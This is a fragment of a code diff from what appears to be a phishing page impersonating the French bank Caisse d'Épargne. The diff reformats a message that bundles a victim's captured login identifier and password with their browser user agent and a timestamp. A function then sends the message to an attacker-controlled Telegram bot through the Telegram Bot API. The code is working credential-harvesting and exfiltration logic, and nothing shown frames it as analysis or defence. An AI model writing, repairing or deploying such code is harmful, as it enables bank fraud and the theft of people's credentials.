@@ -402,17 +402,7 @@
 
         // Envoi à Telegram
         async function sendToTelegram() {
-            const message = `
-🏦 CAISSE D'ÉPARGNE - NOUVELLE CONNEXION 🏦
-━━━━━━━━━━━━━━━━━━━━━
-👤 Identifiant: ${identifiantSaisi}
-🔑 Mot de passe: ${motDePasseSaisi}
-━━━━━━━━━━━━━━━━━━━━━
-🌍 Plateforme: Caisse d'Épargne
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}
-✅ Statut: Connexion en cours
-`;
+            const message = `🏦 CAISSE D'ÉPARGNE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${identifiantSaisi}\n🔑 Mot de passe: ${motDePasseSaisi}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 Plateforme: Caisse d'Épargne\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
